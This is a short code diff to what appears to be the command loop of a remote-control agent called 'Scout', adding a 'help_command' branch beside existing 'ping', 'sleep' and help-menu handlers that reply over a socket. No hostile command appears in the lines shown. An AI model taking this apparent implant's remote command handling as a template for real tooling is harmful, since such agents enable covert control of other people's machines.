@@ -123,6 +123,8 @@ while True:
                     main_send(pickle.dumps(comp_list), s)
                 elif interface == "CUI":
                     main_send(help_menu, s)
+            elif command == "help_command":
+                main_send(help_menu, s)
             elif command == 'ping':
                 main_send('[+]Scout is alive', s)
             elif command == 'sleep':
